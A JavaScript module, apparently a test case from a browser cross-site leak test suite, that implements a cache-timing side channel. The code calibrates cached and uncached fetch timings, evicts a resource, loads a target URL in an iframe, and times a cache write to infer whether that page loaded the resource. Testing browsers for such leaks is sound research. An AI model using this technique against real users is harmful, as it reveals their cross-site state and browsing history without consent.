import { TEST_URL } from './../config.js'
let RESOURCE = `${TEST_URL}testcases/files/image1.gif`


const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const calibrate = async (r, method='POST') =>  {
    let times = 5
    let t_nocache = 0
    let t_cache = 0

    // without cache
    for (let i = 0; i < times; i++){
        await killcache(r, method)
        await sleep(100)
        t_nocache += await timeit(r)
    }
    t_nocache /= times
    
    // make sure its in the cache
    await timeit(r)

    // now with cache
    for (let i = 0; i < times; i++){
        await sleep(100)
        t_cache += await timeit(r)
    }
    t_cache /= times
    console.debug(`avg time nocache: ${t_nocache}, avg time cache: ${t_cache}, Limit: ${(t_nocache + t_cache) / 2}`)
    // make sure timing data makes sense
    if(t_nocache / t_cache < 1.3){
        throw {message: 'No timing difference.'}
    }
    return (t_nocache + t_cache) / 2
    
 
}

const killcache = async (r, method) => {
    if (method === 'POST'){
        await fetch(r, {method: 'POST', mode: 'no-cors', cache:'reload', credentials: 'include'}).catch(e=>console.error(e));
    } 
    if (method === 'CORS'){
        try{
            await fetch(r, {method: 'GET', mode: 'cors', cache: 'reload', credentials: 'include'})
        }
        catch(e){}
    }
}

/*
BUG:
time request to url with performance api
safari will not create performance entries in some cases here?!
so we cant not use this

const timeit = async (url) => {
    return new Promise(async (r) => {
        new PerformanceObserver((list, observer) => {
            observer.disconnect()
            let e = list.getEntries()[0]
            // can not use duration because of safari
            return r(e.responseEnd - e.fetchStart)
        }).observe({
            entryTypes: ["resource"]
        })
        await fetch(url, {
            method: 'GET',
            mode: 'no-cors',
            cache: 'force-cache',
            credentials: 'include'
        })
    })
}
*/

const timeit = async (url) => {
    return new Promise(async (r) => {
        let cache = await caches.open('cache')
        // fetch it
        let res = await fetch(url, {
            method: 'GET',
            mode: 'no-cors',
            cache: 'force-cache',
            credentials: 'include'
        })
        // time how long it takes to put into cache
        let start = performance.now()
        // if the browser cached the response, this cache will not be updated
        // - if only we could detect this without measuring time
        cache.put(new Request(url), res.clone()).then(() => {
            return r(performance.now() - start)
        })
    })
}

const leak = async (url) => {
    // calibrate time
    let limit = await calibrate(RESOURCE, 'CORS')

    return new Promise(async (r) =>  {
        // Evict this from the cache (force an error).
        await killcache(RESOURCE, 'CORS')

        // load page that maybe has the resource
        let f = document.createElement('iframe')
        f.src = url
        document.body.append(f)

        // window.WW.location = url

        // wait for it to load
        await sleep(1500)

        f.remove()

        // now check if it is cached
        let t = await timeit(RESOURCE)
        console.debug(`request took: ${t}, limit is: ${limit}`)
        if (t < limit){
            return r(1)
        }
        return r(0)
    })
}


export { leak }